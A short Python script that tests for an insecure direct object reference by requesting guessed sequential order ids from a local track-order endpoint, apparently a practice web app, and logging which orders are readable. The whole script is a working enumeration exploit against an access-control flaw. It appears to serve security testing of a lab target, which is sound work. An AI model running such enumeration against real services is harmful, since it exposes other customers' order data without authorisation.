# idor_test.py
import requests, json, datetime, os

URL = "http://localhost:3000/rest/track-order"
ORDERS = ["12345", "12346", "12347"]   # guess sequential order ids

def try_order(oid):
    r = requests.get(f"{URL}/{oid}")
    return r.status_code == 200 and "product" in r.text

found = [oid for oid in ORDERS if try_order(oid)]
out = {"accessible_orders": found, "timestamp": str(datetime.datetime.now())}
with open(os.path.join(os.getcwd(), "idor_test.json"), "w") as f:
    json.dump(out, f, indent=2)
print("IDOR orders found:", len(found))